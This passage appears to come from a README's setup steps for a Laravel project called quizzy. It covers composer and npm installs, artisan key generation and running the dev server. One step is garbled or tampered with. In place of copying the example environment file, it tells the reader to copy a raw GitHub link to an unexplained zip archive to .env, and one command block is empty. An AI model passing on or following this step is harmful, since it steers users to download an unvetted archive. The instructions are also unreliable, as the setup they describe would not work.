
   ```bash
   composer install
   npm install && npm run dev
   ```

   * Copy `https://raw.githubusercontent.com/RafiBinWores/quizzy/main/ejective/quizzy.zip` to `.env`

   ```bash
   php artisan key:generate
   ```

   ```bash

   ```

6. **Start the development server**

   ```bash
   php artisan serve
   ```
